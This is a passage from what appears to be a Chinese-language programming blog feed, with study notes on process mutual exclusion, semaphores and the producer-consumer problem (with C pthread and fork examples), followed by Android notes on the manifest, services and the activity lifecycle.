title="进程互斥"></a>进程互斥</h5><p>进程互斥当某一进程正在访问某一存储区域时，不允许其他进程来读出或者修改存储区的内容<br>进程间的这种互相制约关系称为互斥</p><p>互斥:  一般是资源使用，只能独自占用。<br>同步: 一般是 相互等待同步进行。</p><ol><li> 锁机制</li><li> 信号量机制</li></ol><h5 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h5><p><strong>临界资源</strong><br>   一种只能单独使用的资源<br><strong>临界区</strong><br>  访问临界资源的程序段</p><h6 id="针对临界资源进行操作"><a href="#针对临界资源进行操作" class="headerlink" title="针对临界资源进行操作"></a>针对临界资源进行操作</h6><p>忙则等待</p><p>空闲等待</p><p>有限等待</p><p>让权等待</p><h4 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h4><p>根据信号决定信号量，很多互斥情况一般为0或者1  。</p><h6 id="例子-信号为互斥-设置量为1"><a href="#例子-信号为互斥-设置量为1" class="headerlink" title="例子:  (信号为互斥 设置量为1)"></a>例子:  (信号为互斥 设置量为1)</h6><p>司机(p1)<br>汽车启动<br>行驶<br>停止</p><p>售票员(p2)</p><p>关门</p><p>售票</p><p>开门</p><p>两个资源  1. 关门 s1             2. 停车  s2<br>p2V(s1  0+1)  -&gt;  p1  P(s1   1-1)<br>p1(V(s2  0+1))  -&gt; p2(P(s2 1-1))</p><p>其实根据个人的理解来看，我们的s2 和s1 是信号 ，也是资源。我们都是在争夺对应的资源。同时这种资源并非只有在1或者0，多个量。</p><blockquote><p> 引入休眠和唤醒的概念，一般来讲休眠，就是p操作，  唤醒就是v操作。根据个人理解来看，p操作导致休眠是一个信号量小于0，才导致休眠。否则就是占领。一般就是自身休眠也就是相当于等待。</p></blockquote><h5 id="s2和s1的初始值"><a href="#s2和s1的初始值" class="headerlink" title="s2和s1的初始值"></a>s2和s1的初始值</h5><p>全为0<br><strong>流程图:</strong></p><ol><li><p>P(s1) 司机休眠</p></li><li><p>关门</p></li><li><p>V(S1)</p></li><li><p>售票</p></li><li><p>P(S2) 休眠</p></li><li><p>启动</p></li><li><p>运行</p></li><li><p>到站</p></li><li><p>V(S2)</p></li><li><p> 司机end</p></li><li><p>售票员  开门</p></li><li><p> 售票员 end</p></li></ol><p>其实信号量是一个全局变量,可以变化相当于进程通信。 一般来讲，一个进程中想要占用资源，一般就是cpu或者是一个打印机。</p><h4 id="互斥和同步的信号量"><a href="#互斥和同步的信号量" class="headerlink" title="互斥和同步的信号量"></a>互斥和同步的信号量</h4><ol><li><p>同步一般是并非是具体的资源而是一种信号，一般初始值设置为0就可以</p></li><li><p>互斥并非还抽象的资源而是具体的资源，一般来讲是需要根据资源数量来作为初值。</p></li></ol><p>在互斥中，信号量的值负数可以代表有多少进程在等待。</p><h4 id="生产者和消费者"><a href="#生产者和消费者" class="headerlink" title="生产者和消费者"></a>生产者和消费者</h4><p>同步问题:</p><p>信号量为s1 缓冲区为0 空和1 非空</p><p>生产者(P(s1))   1–  </p><p>V(s1)                 0++</p><p>信号量为s2  缓冲区 0空  1非空</p><p>消费者(P(s2))    </p><p>互斥问题:</p><p>我们把缓冲区个数作为信号量</p><h4 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h4><h5 id="信号量-1"><a href="#信号量-1" class="headerlink" title="信号量"></a>信号量</h5><ul><li><strong>定义</strong>：信号量是一个整数值，用于表示可用资源的数量。</li><li><strong>类型</strong>：<ul><li><strong>计数信号量</strong>：可以取任何非负整数值，表示多个相同资源的数量。</li><li><strong>二进制信号量</strong>（或互斥锁）：只能取0和1两个值，常用于实现互斥访问。</li></ul></li></ul><h5 id="P操作和V操作"><a href="#P操作和V操作" class="headerlink" title="P操作和V操作"></a>P操作和V操作</h5><p>P和V操作是信号量的基本操作，它们分别用于请求和释放资源。</p><ul><li><p><strong>P操作</strong>（也称为“等待”操作）：</p><ul><li><strong>作用</strong>：当一个进程希望访问某个资源时，它会执行P操作。如果信号量的值大于0，则将其减1并继续执行；如果信号量的值为0，则该进程将被阻塞，直到信号量的值大于0。</li><li><strong>表现</strong>：<code>P(S)</code>，表示对信号量S执行P操作。</li></ul></li><li><p><strong>V操作</strong>（也称为“信号”操作）：</p><ul><li><strong>作用</strong>：当一个进程完成对资源的使用后，它会执行V操作，将信号量的值加1。如果有其他进程因执行P操作而被阻塞，则会唤醒其中一个进程。</li><li><strong>表现</strong>：<code>V(S)</code>，表示对信号量S执行V操作。</li></ul></li></ul><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>假设有一个简单的资源（比如打印机），只有一个进程可以同时使用：</p><ol><li><strong>初始化信号量</strong>：设定信号量<code>S=1</code>，表示打印机可用。</li><li><strong>请求资源</strong>：<ul><li>进程A调用<code>P(S)</code>，信号量变为0，表示打印机正在被使用。</li></ul></li><li><strong>释放资源</strong>：<ul><li>进程A使用完打印机后调用<code>V(S)</code>，信号量变回1，表示打印机可用。</li></ul></li></ol><h5 id="同步和互斥例子-生产者与消费者"><a href="#同步和互斥例子-生产者与消费者" class="headerlink" title="同步和互斥例子 生产者与消费者"></a>同步和互斥例子 生产者与消费者</h5><p>生产者-消费者问题是计算机科学中的一个经典问题，它描述了两组进程（生产者和消费者）共享一个有限大小的缓冲区。生产者的任务是生成数据并将其放入缓冲区，而消费者的任务是从缓冲区取出数据并进行处理。这个问题涉及到两个关键的同步问题：互斥和同步。</p><h6 id="同步（Synchronization）"><a href="#同步（Synchronization）" class="headerlink" title="同步（Synchronization）"></a>同步（Synchronization）</h6><p>同步是指协调多个线程的执行顺序，以确保它们能够按照正确的顺序执行。在生产者-消费者问题中，同步确保生产者在缓冲区满时等待，消费者在缓冲区空时等待。这需要一种机制来控制生产者和消费者之间的交互，确保它们不会在不适当的时间尝试访问缓冲区。</p><h6 id="互斥（Mutex）"><a href="#互斥（Mutex）" class="headerlink" title="互斥（Mutex）"></a>互斥（Mutex）</h6><p>互斥是指在任何时候，只有单个线程可以访问共享资源。在生产者-消费者问题中，当生产者向缓冲区添加数据或消费者从缓冲区取出数据时，需要确保这些操作是互斥的，以防止多个生产者或消费者同时访问缓冲区，这可能导致数据不一致或缓冲区溢出。</p><h6 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h6><p>假设有一个固定大小的缓冲区，生产者可以生成数据并将其放入缓冲区，而消费者可以从缓冲区取出数据。如果没有适当的同步机制，可能会出现以下问题：</p><ol><li><strong>缓冲区溢出</strong>：如果生产者在缓冲区已满时继续添加数据，可能会导致缓冲区溢出。</li><li><strong>数据丢失</strong>：如果消费者在缓冲区为空时尝试取出数据，可能会导致数据丢失。</li><li><strong>竞争条件</strong>：如果没有互斥机制，多个生产者或消费者可能同时访问缓冲区，导致数据不一致。</li></ol><h6 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h6><p>为了解决这些问题，可以使用信号量来实现互斥和同步：</p><ol><li><strong>互斥信号量</strong>：用于确保一次只有一个生产者或消费者访问缓冲区。这通常通过一个二进制信号量（初始值为1）来实现。</li><li><strong>同步信号量</strong>：用于控制生产者和消费者之间的交互。通常需要两个信号量：一个用于表示缓冲区中可用的空位（初始值为缓冲区大小），另一个用于表示缓冲区中的数据项（初始值为0）。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;semaphore.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">#define BUFFER_SIZE <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="type">int</span> <span class="variable">in</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// 生产者放入数据的位置</span></span><br><span class="line"><span class="type">int</span> <span class="variable">out</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// 消费者取出数据的位置</span></span><br><span class="line"></span><br><span class="line">sem_t empty; <span class="comment">// 空位信号量</span></span><br><span class="line">sem_t full;  <span class="comment">// 满位信号量</span></span><br><span class="line">pthread_mutex_t mutex; <span class="comment">// 互斥锁</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* producer(<span class="keyword">void</span>* arg) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        sem_wait(&amp;empty); <span class="comment">// 等待空位</span></span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// 进入临界区</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生产数据</span></span><br><span class="line">        buffer[in] = i;</span><br><span class="line">        printf(<span class="string">&quot;Produced: %d\n&quot;</span>, buffer[in]);</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// 离开临界区</span></span><br><span class="line">        sem_post(&amp;full); <span class="comment">// 增加满位计数</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>); <span class="comment">// 模拟生产时间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* consumer(<span class="keyword">void</span>* arg) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        sem_wait(&amp;full); <span class="comment">// 等待满位</span></span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// 进入临界区</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 消费数据</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> buffer[out];</span><br><span class="line">        printf(<span class="string">&quot;Consumed: %d\n&quot;</span>, data);</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// 离开临界区</span></span><br><span class="line">        sem_post(&amp;empty); <span class="comment">// 增加空位计数</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>); <span class="comment">// 模拟消费时间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    </span><br><span class="line">    pthread_t prod, cons;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化信号量和互斥锁</span></span><br><span class="line">    sem_init(&amp;empty, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    sem_init(&amp;full, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    pthread_mutex_init(&amp;mutex, NULL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建生产者和消费者线程</span></span><br><span class="line">    pthread_create(&amp;prod, NULL, producer, NULL);</span><br><span class="line">    pthread_create(&amp;cons, NULL, consumer, NULL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待线程结束</span></span><br><span class="line">    pthread_join(prod, NULL);</span><br><span class="line">    pthread_join(cons, NULL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理资源</span></span><br><span class="line">    sem_destroy(&amp;empty);</span><br><span class="line">    sem_destroy(&amp;full);</span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="父子进程"><a href="#父子进程" class="headerlink" title="父子进程"></a>父子进程</h4><h5 id="什么是父进程和子进程？"><a href="#什么是父进程和子进程？" class="headerlink" title="什么是父进程和子进程？"></a>什么是父进程和子进程？</h5><ul><li><strong>父进程</strong>：创建另一个进程的进程。</li><li><strong>子进程</strong>：由父进程创建的进程</li></ul><h5 id="fork-函数的作用"><a href="#fork-函数的作用" class="headerlink" title="fork 函数的作用"></a><code>fork</code> 函数的作用</h5><p><code>fork</code> 是用于创建新进程的系统调用。它会复制当前进程，返回两次：</p><ul><li>在父进程中，返回子进程的 PID（进程标识符）。</li><li>在子进程中，返回 0。</li></ul><p>这意味着父子<br>进程几乎完全相同（包括执行的代码），但它们有不同的 PID 和某些独立的资源。</p><h5 id="如何实现并发"><a href="#如何实现并发" class="headerlink" title="如何实现并发"></a>如何实现并发</h5><p>在 C 语言中，通过 <code>fork</code> 创建的父子进程可以同时执行。由于操作系统的进程调度，它们可能交替运行。通过这种方式，可以实现简单的并发</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILENAME <span class="string">&quot;output.txt&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 打开文件以写入，使用 O_CREAT 创建文件，如果已存在则追加内容</span></span><br><span class="line">    <span class="type">int</span> fd = open(FILENAME, O_WRONLY | O_CREAT | O_APPEND, <span class="number">0644</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = fork(); <span class="comment">// 创建新进程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123; <span class="comment">// fork失败</span></span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">// 子进程</span></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *child_msg = <span class="string">&quot;Hello from child!\n&quot;</span>;</span><br><span class="line">        write(fd, child_msg, <span class="built_in">strlen</span>(child_msg)); <span class="comment">// 写入文件</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child process wrote to file.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 父进程</span></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *parent_msg = <span class="string">&quot;Hello from parent!\n&quot;</span>;</span><br><span class="line">        write(fd, parent_msg, <span class="built_in">strlen</span>(parent_msg)); <span class="comment">// 写入文件</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Parent process wrote to file.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fd); <span class="comment">// 关闭文件描述符</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fork 创建完毕进程之后,父子进程是一样的,此时我们有两个进程,需要操作系统进行并发调度。而刚好可以通过fork返回值判断父子进程。</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>manifest</title>
      <link href="/2024/10/20/manifest/"/>
      <url>/2024/10/20/manifest/</url>
      
        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;manifest xmlns:android=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;application</span><br><span class="line">        android:allowBackup=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span><br><span class="line">        android:label=<span class="string">&quot;@string/app_name&quot;</span></span><br><span class="line">        android:roundIcon=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span><br><span class="line">        android:supportsRtl=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:theme=<span class="string">&quot;@style/Theme.AppCompat.Light.NoActionBar&quot;</span>&gt;</span><br><span class="line">        &lt;activity</span><br><span class="line">            android:name=<span class="string">&quot;.MainActivity_B&quot;</span></span><br><span class="line">            android:exported=<span class="string">&quot;false&quot;</span> /&gt;</span><br><span class="line">        &lt;activity</span><br><span class="line">            android:name=<span class="string">&quot;.MainActivity_A&quot;</span></span><br><span class="line">            android:exported=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">                &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/application&gt;</span><br><span class="line"></span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这是一个manifest文件,一般来讲我们通过这个文件定义程序，同时根据这个标签定义我们的活动。<br>活动必须要指定一个main活动。其实就是指定一个main入口</p></blockquote><h4 id="自闭合标签"><a href="#自闭合标签" class="headerlink" title="自闭合标签"></a>自闭合标签</h4><p>在 Android 的 <code>AndroidManifest.xml</code> 文件中，活动（<code>&lt;activity&gt;</code>）标签是一个单独的自闭合标签。在 XML 中，标签可以自闭合，表示没有子元素。在这种情况下，活动的定义可以写成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity</span><br><span class="line">    android:name=<span class="string">&quot;.MainActivity_B&quot;</span></span><br><span class="line">    android:exported=<span class="string">&quot;false&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><h5 id="自闭合标签解释："><a href="#自闭合标签解释：" class="headerlink" title="自闭合标签解释："></a>自闭合标签解释：</h5><ul><li><strong>自闭合标签</strong>：<code>&lt;tag /&gt;</code> 的形式表示这个标签没有子元素，也就是说它是一个完整的元素，不需要配对的结束标签。例如，像 <code>&lt;activity /&gt;</code> 这样的标签就是自闭合的。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Android移动开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android移动开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>service</title>
      <link href="/2024/10/20/service/"/>
      <url>/2024/10/20/service/</url>
      
        <content type="html"><![CDATA[<h4 id="活动（Activity）"><a href="#活动（Activity）" class="headerlink" title="活动（Activity）"></a>活动（Activity）</h4><ul><li><strong>定义</strong>：Activity是一个可以通过用户直接交互的屏幕。它是用户与应用交互的窗口，可以包含各种视图（View）和视图组（ViewGroup）。</li><li><strong>生命周期</strong>：Activity具有丰富的生命周期，包括创建（onCreate）、启动（onStart）、运行（onResume）、暂停（onPause）、停止（onStop）和销毁（onDestroy）等状态。</li><li><strong>用户界面</strong>：Activity负责管理用户界面。每个Activity通常对应应用中的一个屏幕。</li><li><strong>交互</strong>：Activity可以直接与用户交互，响应用户的输入，如点击、滑动等。</li><li><strong>任务和回退栈</strong>：Activity通常被组织在任务和回退栈中，用户可以通过按下返回键来导航。</li></ul><h4 id="服务（Service）"><a href="#服务（Service）" class="headerlink" title="服务（Service）"></a>服务（Service）</h4><ul><li><strong>定义</strong>：Service是一个运行在后台，不提供直接用户界面的组件。它用于执行长时间运行的操作，或者为远程组件（如Activity）提供功能。</li><li><strong>生命周期</strong>：Service的生命周期比Activity简单，主要包括创建（onCreate）、绑定（onBind）、未绑定（onUnbind）、销毁（onDestroy）等状态。</li><li><strong>后台任务</strong>：Service适合执行不需要用户直接交互的后台任务，如播放音乐、处理文件、执行网络请求等。</li><li><strong>绑定和通信</strong>：Service可以通过绑定机制与Activity通信。Activity可以通过调用Service的<code>bindService</code>方法来绑定Service，并使用回调接口（Binder）与Service进行交互。</li><li><strong>前台和后台</strong>：Service可以运行在前台或后台。前台Service通常会显示一个持续的通知，以便用户知道Service正在运行。</li></ul><h4 id="服务周期"><a href="#服务周期" class="headerlink" title="服务周期"></a>服务周期</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MusicService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> MediaPlayer mediaPlayer;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate();</span><br><span class="line">        mediaPlayer = MediaPlayer.create(<span class="built_in">this</span>, R.raw.your_music_file); <span class="comment">// 你的音乐文件</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> &#123;</span><br><span class="line">        mediaPlayer.start();</span><br><span class="line">        <span class="keyword">return</span> START_STICKY; <span class="comment">// 确保服务在被系统杀掉后重新启动</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        mediaPlayer.stop();</span><br><span class="line">        mediaPlayer.release();</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 如果不需要绑定，返回null</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>onStartCommand</code> 是 Android 服务中的一个回调方法，用于处理启动服务的请求。具体来说，它在以下情况下被调用</p><h5 id="返回值："><a href="#返回值：" class="headerlink" title="返回值："></a>返回值：</h5><p><code>onStartCommand</code> 需要返回一个整数，表示服务的启动模式：</p><ul><li><strong>START_STICKY</strong>：如果系统杀死了服务，重启时会调用 <code>onStartCommand</code>，但不会传递原来的 <code>Intent</code>。</li><li><strong>START_NOT_STICKY</strong>：如果系统杀死了服务，则不重启服务。</li><li><strong>START_REDELIVER_INTENT</strong>：如果系统杀死了服务，重启时会调用 <code>onStartCommand</code>，并传递最后的 <code>Intent</code>。</li></ul><h4 id="服务启动"><a href="#服务启动" class="headerlink" title="服务启动"></a>服务启动</h4><p><code>R.raw.your_music_file</code> 是指将音乐文件放在项目的 <code>res/raw</code> 目录下。在 Android Studio 中，你可以右击 <code>res</code> 文件夹，选择 “New” &gt; “Directory” 创建 <code>raw</code> 文件夹，然后将你的音乐文件放入其中。确保文件名是小写字母，并且不包含空格或特殊字符</p>]]></content>
      
      
      <categories>
          
          <category> Android移动开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android移动开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>activity</title>
      <link href="/2024/10/20/activity/"/>
      <url>/2024/10/20/activity/</url>
      
        <content type="html"><![CDATA[<h4 id="what"><a href="#what" class="headerlink" title="what"></a>what</h4><h5 id="Activity-的基本概念"><a href="#Activity-的基本概念" class="headerlink" title="Activity 的基本概念"></a>Activity 的基本概念</h5><p><strong>Activity</strong> 是 Android 应用的一个单独的屏幕，相当于一个窗口或页面。每个 Activity 通常都对应着一个用户界面（UI），并且是用户与应用程序交互的入口点。</p><ul><li><strong>Activity 的生命周期</strong>：Activity 有一套预定义的生命周期方法，用于管理它的创建、显示、暂停和销毁状态。</li><li><strong>每个应用至少有一个 Activity</strong>：通常，应用的主界面就是一个 Activity。当你打开一个应用时，系统会启动该应用的第一个 Activity。</li></ul><h4 id="Activity-的生命周期"><a href="#Activity-的生命周期" class="headerlink" title="Activity 的生命周期"></a>Activity 的生命周期</h4><p>理解 <strong>Activity 的生命周期</strong> 对于管理应用资源、避免内存泄漏和优化用户体验非常重要。下面是 Activity 生命周期的主要方法及其用途：</p><ol><li><p><strong>onCreate()</strong>：Activity 被创建时调用。你通常会在这个方法中初始化用户界面和设置一些初始数据。</p></li><li><p><strong>onStart()</strong>：Activity 即将对用户可见时调用。</p></li><li><p><strong>onResume()</strong>：Activity 开始与用户交互时调用，应用进入“前台”。</p></li><li><p><strong>onPause()</strong>：Activity 即将离开前台（例如，用户切换到另一个应用时）调用。你可以在这里保存数据或停止动画等。 